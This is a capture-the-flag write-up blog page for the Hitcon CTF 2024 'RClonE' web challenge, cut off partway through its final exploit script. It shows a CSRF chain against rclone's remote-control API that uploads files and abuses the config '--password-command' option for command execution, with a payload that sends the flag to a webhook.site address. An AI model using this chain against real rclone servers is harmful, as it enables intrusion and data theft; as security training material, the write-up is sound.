<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hitcon CTF 2024 RClonE" /><meta name="author" content="m0z" /><meta property="og:locale" content="en" /><meta name="description" content="For Hitcon this year we played with the World Wide Union merger. The web challenges were all really interesting and I learned a lot." /><meta property="og:description" content="For Hitcon this year we played with the World Wide Union merger. The web challenges were all really interesting and I learned a lot." /><link rel="canonical" href="https://ireland.re/posts/HitconCTF_2024/" /><meta property="og:url" content="https://ireland.re/posts/HitconCTF_2024/" /><meta property="og:site_name" content="Ireland.RE" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-07-14T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hitcon CTF 2024 RClonE" /><meta name="twitter:site" content="@LooseSecurity" /><meta name="twitter:creator" content="@m0z" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m0z"},"dateModified":"2024-07-14T16:09:30+00:00","datePublished":"2024-07-14T00:00:00+00:00","description":"For Hitcon this year we played with the World Wide Union merger. The web challenges were all really interesting and I learned a lot.","headline":"Hitcon CTF 2024 RClonE","mainEntityOfPage":{"@type":"WebPage","@id":"https://ireland.re/posts/HitconCTF_2024/"},"url":"https://ireland.re/posts/HitconCTF_2024/"}</script><title>Hitcon CTF 2024 RClonE | Ireland.RE</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ireland.RE"><meta name="application-name" content="Ireland.RE"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/logo.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ireland.RE</a></div><div class="site-subtitle font-italic">Ireland Without the RE</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/members/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>MEMBERS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ECSCIreland" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/LooseSecurity" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['none','none.none'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hitcon CTF 2024 RClonE</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hitcon CTF 2024 RClonE</h1><div class="post-meta text-muted"><div> By <em> <a href="https://ctftime.org/team/179144">Ireland Without the RE</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1720915200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-07-14 </em> </span> <span> Updated <em class="timeago" data-ts="1720973370" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-07-14 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1421 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><p>For Hitcon this year we played with the World Wide Union merger. The web challenges were all really interesting and I learned a lot.</p><h2 id="webrclone"><span class="mr-2">web/RClonE</span><a href="#webrclone" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>I collaborated with gg0h on this challenge and we managed to solve it together.</p><h3 id="initial-analaysis"><span class="mr-2">Initial Analaysis</span><a href="#initial-analaysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Opening up the initial source files we are greeted with the following <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> file:</p><div class="language-yaml highlighter-rouge"><div class="code-header"> <span data-label-text="YAML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="na">services</span><span class="pi">:</span>
  <span class="na">rclone</span><span class="pi">:</span>
    <span class="na">image</span><span class="pi">:</span> <span class="s">rclone</span>
    <span class="na">build</span><span class="pi">:</span> <span class="s">.</span>
    <span class="na">environment</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s">SECRET=secret</span>  <span class="c1"># randomized secret per instancer</span>
    <span class="na">networks</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s">chall</span>
  <span class="na">bot</span><span class="pi">:</span>
    <span class="na">image</span><span class="pi">:</span> <span class="s">rclone-bot</span>
    <span class="na">build</span><span class="pi">:</span> <span class="s">./bot</span>
    <span class="na">environment</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s">TITLE=Admin Bot for RClonE</span>
      <span class="pi">-</span> <span class="s">PORT=8000</span>
      <span class="pi">-</span> <span class="s">URL_CHECK_REGEX=^https?://.{1,256}$</span>
      <span class="pi">-</span> <span class="s">SECRET=secret</span>  <span class="c1"># randomized secret per instancer</span>
    <span class="na">security_opt</span><span class="pi">:</span> 
      <span class="pi">-</span> <span class="s">seccomp=chrome.json</span>
    <span class="na">ports</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">${PORT}:8000"</span>
    <span class="na">networks</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s">default</span>
      <span class="pi">-</span> <span class="s">chall</span>
<span class="na">networks</span><span class="pi">:</span>
  <span class="na">chall</span><span class="pi">:</span>
    <span class="na">internal</span><span class="pi">:</span> <span class="no">true</span>

</pre></table></code></div></div><p>We notice two containers; a bot which is being built from local sources and a version of “rclone”. However, the Dockerfile indicates that a <code class="language-plaintext highlighter-rouge">readflag</code> binary is present in the root directory and must be executed to retrieve the flag. This is added to the <code class="language-plaintext highlighter-rouge">rclone</code> container and so we must achieve remote code execution in the context of this container.</p><div class="language-Dockerfile highlighter-rouge"><div class="code-header"> <span data-label-text="Dockerfile"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="k">FROM</span><span class="s"> debian:bookworm-slim</span>

<span class="k">RUN </span>apt-get update <span class="o">&amp;&amp;</span> <span class="se">\
</span>    apt-get <span class="nb">install</span> <span class="nt">-y</span> tini ca-certificates curl unzip <span class="o">&amp;&amp;</span> <span class="se">\
</span>    apt-get clean <span class="o">&amp;&amp;</span> <span class="se">\
</span>    <span class="nb">rm</span> <span class="nt">-rf</span> /var/lib/apt/lists/<span class="k">*</span>
<span class="k">WORKDIR</span><span class="s"> /workdir</span>

<span class="k">ARG</span><span class="s"> RCLONE_VERSION=v1.67.0</span>
<span class="k">ARG</span><span class="s"> RCLONE_NAME=rclone-$RCLONE_VERSION-linux-amd64</span>
<span class="k">ARG</span><span class="s"> RCLONE_HASH=07c23d21a94d70113d949253478e13261c54d14d72023bb14d96a8da5f3e7722</span>

<span class="k">RUN </span>curl https://downloads.rclone.org/<span class="nv">$RCLONE_VERSION</span>/<span class="nv">$RCLONE_NAME</span>.zip <span class="nt">-o</span> rclone.zip <span class="o">&amp;&amp;</span> <span class="se">\
</span>    <span class="nb">echo</span> <span class="nv">$RCLONE_HASH</span> rclone.zip | <span class="nb">sha256sum</span> <span class="nt">-c</span> <span class="o">&amp;&amp;</span> <span class="se">\
</span>    unzip rclone.zip <span class="o">&amp;&amp;</span> <span class="se">\
</span>    <span class="nb">mv</span> <span class="nv">$RCLONE_NAME</span>/rclone /usr/bin

<span class="k">COPY</span><span class="s"> ./readflag /readflag</span>
<span class="k">RUN </span><span class="nb">chmod </span>777 /readflag

<span class="k">RUN </span>useradd <span class="nt">-ms</span> /bin/bash ctf
<span class="k">USER</span><span class="s"> ctf</span>

<span class="k">ENTRYPOINT</span><span class="s"> ["tini", "--"]</span>
<span class="k">CMD</span><span class="s"> rclone rcd --rc-addr 0.0.0.0:5572 --rc-web-gui --rc-user $SECRET --rc-pass $SECRET --rc-web-gui-no-open-browser</span>

</pre></table></code></div></div><p>When looking at the <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> file we notice that the <code class="language-plaintext highlighter-rouge">rclone</code> container is restricted to an internal network which the bot may access. As such, it becomes clear that we must send a payload to the bot which will cause the bot to execute our RCE payload and extract the flag from the binary.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">puppeteer</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">puppeteer</span><span class="dl">'</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">SECRET</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">SECRET</span> <span class="o">||</span> <span class="dl">'</span><span class="s1">secret</span><span class="dl">'</span>
<span class="kd">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="k">async</span> <span class="nx">ms</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">ms</span><span class="p">))</span>

<span class="kd">const</span> <span class="nx">auth</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">SECRET</span><span class="p">}</span><span class="s2">:</span><span class="p">${</span><span class="nx">SECRET</span><span class="p">}</span><span class="s2">`</span>
<span class="kd">const</span> <span class="nx">SITE</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">SITE</span> <span class="o">||</span> <span class="dl">'</span><span class="s1">http://rclone:5572</span><span class="dl">'</span>
<span class="kd">const</span> <span class="nx">tmpurl</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s2">`/?login_token=</span><span class="p">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">auth</span><span class="p">))}</span><span class="s2">`</span><span class="p">,</span> <span class="nx">SITE</span><span class="p">)</span>
<span class="nx">tmpurl</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="nx">SECRET</span>
<span class="nx">tmpurl</span><span class="p">.</span><span class="nx">password</span> <span class="o">=</span> <span class="nx">SECRET</span>
<span class="kd">const</span> <span class="nx">LOGIN_URL</span> <span class="o">=</span> <span class="nx">tmpurl</span><span class="p">.</span><span class="nx">href</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">[+] LOGIN_URL:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">LOGIN_URL</span><span class="p">)</span>

<span class="kd">let</span> <span class="nx">browser</span> <span class="o">=</span> <span class="kc">null</span>

<span class="kd">const</span> <span class="nx">visit</span> <span class="o">=</span> <span class="k">async</span> <span class="nx">url</span> <span class="o">=&gt;</span> <span class="p">{</span>
	<span class="kd">let</span> <span class="nx">context</span> <span class="o">=</span> <span class="kc">null</span>
	<span class="k">try</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">browser</span><span class="p">)</span> <span class="p">{</span>
			<span class="kd">const</span> <span class="nx">args</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="s1">--js-flags=--jitless,--no-expose-wasm</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">--disable-gpu</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">--disable-dev-shm-usage</span><span class="dl">'</span><span class="p">]</span>
			<span class="k">if</span> <span class="p">(</span><span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">SITE</span><span class="p">).</span><span class="nx">protocol</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">http:</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
				<span class="nx">args</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">`--unsafely-treat-insecure-origin-as-secure=</span><span class="p">${</span><span class="nx">SITE</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span>
			<span class="p">}</span>
			<span class="nx">browser</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
				<span class="na">headless</span><span class="p">:</span> <span class="dl">'</span><span class="s1">new</span><span class="dl">'</span><span class="p">,</span>
				<span class="nx">args</span>
			<span class="p">})</span>
		<span class="p">}</span>

		<span class="nx">context</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">createBrowserContext</span><span class="p">()</span>

		<span class="kd">const</span> <span class="nx">page1</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">()</span>
		<span class="k">await</span> <span class="nx">page1</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="nx">LOGIN_URL</span><span class="p">)</span>
		<span class="k">await</span> <span class="nx">page1</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>

		<span class="kd">const</span> <span class="nx">page2</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">newPage</span><span class="p">()</span>
		<span class="k">await</span> <span class="nb">Promise</span><span class="p">.</span><span class="nx">race</span><span class="p">([</span>
			<span class="nx">page2</span><span class="p">.</span><span class="nx">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span>
				<span class="na">waitUntil</span><span class="p">:</span> <span class="dl">'</span><span class="s1">networkidle0</span><span class="dl">'</span>
			<span class="p">}),</span>
			<span class="nx">sleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">)</span>
		<span class="p">])</span>
		<span class="k">await</span> <span class="nx">page2</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>

		<span class="k">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
		<span class="nx">context</span> <span class="o">=</span> <span class="kc">null</span>
	<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
	<span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="nx">context</span><span class="p">)</span> <span class="k">await</span> <span class="nx">context</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">visit</span>

<span class="k">if</span> <span class="p">(</span><span class="nx">require</span><span class="p">.</span><span class="nx">main</span> <span class="o">===</span> <span class="nx">module</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">visit</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://example.com</span><span class="dl">'</span><span class="p">)</span>
<span class="p">}</span>

</pre></table></code></div></div><p>Above you can browse the source code of the <code class="language-plaintext highlighter-rouge">bot.js</code> file. Here we can see that the bot will authenticate with the <code class="language-plaintext highlighter-rouge">rclone</code> container and log into its dashboard before visiting our URL. This means that we can leverage any post-auth remote code execution vulnerabilities to solve this challenge.</p><h3 id="escaping-the-xss-rabbit-hole"><span class="mr-2">Escaping The XSS Rabbit Hole</span><a href="#escaping-the-xss-rabbit-hole" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>The initial assumption we made was that this service could be exploited using XSS. Given that we have no access to the internal dashboard ourselves, the only plausible chain I could imagine would involve a reflected XSS vulnerability in the dashboard. Rclone is a pretty popular project (50k+ stars on GitHub) and I wouldn’t expect to easily find such a vulnerability but this is supposed to be a tough CTF so we began searching.</p><p>Nothing obvious was found. At this point, we noticed that when authenticated with a login token (as the bot does) there is no CSRF tokens attached to the session.</p><p><img data-src="https://i.imgur.com/HveGLLb.png" alt="enter image description here" data-proofer-ignore></p><p>And so the idea pivoted to abusing some sort of CSRF on the API. A list of all endpoints can be found here: <a href="https://rclone.org/rc/">https://rclone.org/rc/</a></p><p>But since all the POST endpoints on the API seemed to use JSON we are limited, right? Wrong!</p><p><img data-src="https://i.imgur.com/zacLge3.png" alt="enter image description here" data-proofer-ignore></p><p>So now the idea is to send the bot to our website and submit a number of POST forms to interactive with various APIs. I wrote a basic demo with 2 POST forms pointing to my webhook with <code class="language-plaintext highlighter-rouge">target="_BLANK"</code> attribute set and sent these to the bot. It successfully posted both values.</p><h3 id="finding-rce"><span class="mr-2">Finding RCE</span><a href="#finding-rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>We initially noticed that <code class="language-plaintext highlighter-rouge">core/command</code> endpoint allowed us to pass various commands to rclone as documented here: <a href="https://rclone.org/commands/">https://rclone.org/commands/</a></p><p>At this point gg0h noticed that “encrypted config files” allow you to set a password command for decryption. This is documented here: <a href="https://rclone.org/docs/#configuration-encryption">https://rclone.org/docs/#configuration-encryption</a></p><p>Essentially, we can run a rclone command to decrypt a config file and pass in a <code class="language-plaintext highlighter-rouge">--password-comment</code> parameter with our bash own custom bash command. The command which we found worked was: <code class="language-plaintext highlighter-rouge">rclone config show __config=/path/to/encrypted/conf --password-commmand="FREE RCE"</code></p><p>This however, required that an encrypted file exists on the disk. During our initial testing we found that the <code class="language-plaintext highlighter-rouge">/operations/copyfile</code> endpoint provided for copying remote files to the server in writable directories but this would not work due to the nature of the rclone container’s network configuration (bound internally).</p><h3 id="arbitrary-file-uploads"><span class="mr-2">Arbitrary File Uploads</span><a href="#arbitrary-file-uploads" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>The next obvious approach was to use the <code class="language-plaintext highlighter-rouge">/operations/uploadfile</code> endpoint. This allows a file to be uploaded directly via a multipart form request. We could attach a file to a form and submit it on behalf of a user leveraging the CSRF. This endpoint supports the uploading of multiple files and so we decided to upload a file <code class="language-plaintext highlighter-rouge">rc.conf</code> containing the encrypted configuration file and a <code class="language-plaintext highlighter-rouge">test.sh</code> containing our exploit.</p><h4 id="rcconf"><span class="mr-2">rc.conf</span><a href="#rcconf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-yaml highlighter-rouge"><div class="code-header"> <span data-label-text="YAML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c1"># Encrypted rclone configuration File</span>

<span class="na">RCLONE_ENCRYPT_V0</span><span class="pi">:</span>
<span class="s">cM8HO1ZPJlXcA0m5T/SdhLl7zoKlOhcKfc8vYJywENWphwmo2M2u0ZKYOPRxBSLC6Ax5qVc1Gy2SEfNrfbDv</span>
</pre></table></code></div></div><p>The most obvious approach to executing our payload would be to curl our webhook with the flag but this is again restricted due to the <code class="language-plaintext highlighter-rouge">rclone</code> container being bound by an internal network.</p><h2 id="escaping-the-network"><span class="mr-2">Escaping The Network</span><a href="#escaping-the-network" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>At this point we had the idea to store the output of <code class="language-plaintext highlighter-rouge">/readflag</code> into a writable directory and then serve this over HTTP. We would then need to set an <code class="language-plaintext highlighter-rouge">Access-Control-Allow-Origin: *</code> header to facilitate the bot fetching the output of the page.</p><p>It turns out that the rcd command of rclone facilitates hosting a directory. The following command would serve <code class="language-plaintext highlighter-rouge">/tmp</code> directory on port 1234:</p><p><code class="language-plaintext highlighter-rouge">rclone rcd --rc-serve --rc-addr 0.0.0.0:1234 --rc-files /tmp </code></p><p>So if we ran <code class="language-plaintext highlighter-rouge">/readflag &gt; /tmp/output</code> we would expect this to be accessible to the bot on <code class="language-plaintext highlighter-rouge">http://rclone:1234/output</code> where it would be able to read it.</p><p>To bypass the origin I tried using the <code class="language-plaintext highlighter-rouge">--rc-allow-origin</code> argument and setting it to our host but there were still origin issues with accessing the local address space and I’m unsure if this approach works. My final approach was to instead output our flag to a HTML file and then append some javascript to this HTML file which would simple copy the text on the page and send it to our webhook.</p><h2 id="final-exploit-payload"><span class="mr-2">Final Exploit Payload</span><a href="#final-exploit-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://rclone:5572/operations/uploadfile?fs=/&amp;remote=home/ctf/"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">target=</span><span class="s">"_BLANK"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">id=</span><span class="s">"fileInput"</span> <span class="na">name=</span><span class="s">"file0"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">id=</span><span class="s">"fileInput2"</span> <span class="na">name=</span><span class="s">"file1"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"btn"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;/form&gt;</span>
  
  <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">'http://rclone:5572/core/command?command=config&amp;arg=["show","--config","/home/ctf/rc.conf","--password-command","bash%20/home/ctf/test.sh"]'</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">target=</span><span class="s">"_BLANK"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"btn2"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;/form&gt;</span>
  
  <span class="nt">&lt;script&gt;</span>
  <span class="c1">// Prepare test.sh</span>
  <span class="kd">var</span> <span class="nx">fileContent</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span>
    <span class="s2">`#!/bin/bash\n/readflag&gt;/tmp/lol.html\necho "&lt;script&gt;window.location.href='https://webhook.site/&lt;ID&gt;/'+btoa(document.body.innerText);&lt;\/script&gt;" &gt;&gt; /tmp/lol.html\nrclone rcd --rc-serve --rc-addr 0.0.0.0:1234 --rc-files /tmp`</span>
  <span class="p">],</span> <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/plain</span><span class="dl">"</span> <span class="p">});</span>
  
  <span class="kd">var</span> <span class="nx">file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">([</span><span class="nx">fileContent</span><span class="p">],</span> <span class="dl">"</span><span class="s2">test.sh</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/plain</span><span class="dl">"</span> <span class="p">});</span>
  <span class="kd">var</span> <span class="nx">fileInput</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">fileInput</span><span class="dl">"</span><span class="p">);</span>
  <span class="kd">var</span> <span class="nx">dataTransfer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataTransfer</span><span class="p">();</span>
  <span class="nx">dataTransfer</span><span class="p">.</span><span class="nx">items</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="nx">file</span><span class="p">);</span>
  <span class="nx">fileInput</span><span class="p">.</span><span class="nx">files</span> <span class="o">=</span> <span class="nx">dataTransfer</span><span class="p">.</span><span class="nx">files</span><span class="p">;</span>

  <span class="c1">// Prepare rc.conf</span>
  <span class="kd">var</span> <span class="nx">fileContent</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Blob</span><span class="p">([</span>
    <span class="s2">`# Encrypted rclone configuration File\n\nRCLONE_ENCRYPT_V0:\ncM8HO1ZPJlXcA0m5T/SdhLl7zoKlOhcKfc8vYJywENWphwmo2M2u0ZKYOPRxBSLC6Ax5qVc1Gy2SEfNrfbDv`</span>
  <span class="p">],</span> <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/plain</span><span class="dl">"</span> <span class="p">});</span>
  
